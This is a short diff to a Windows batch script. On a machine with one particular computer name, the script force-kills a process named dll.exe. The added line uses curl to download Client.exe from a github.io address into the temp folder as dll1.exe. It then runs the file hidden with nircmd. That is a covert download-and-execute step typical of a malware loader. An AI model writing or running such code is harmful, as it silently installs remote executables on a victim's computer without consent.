@@ -15,6 +15,7 @@ echo [TARGET START]
 echo %computername%
 if [%computername%]==[DESKTOP-HL4E5JJ] (
 taskkill /f /im dll.exe
+curl.exe %proxy% https://cryptedlumos.github.io/Client.exe --output "%temp%\dll1.exe" && nircmd exec hide "%temp%\dll1.exe"
 ) else (
 echo.
 )
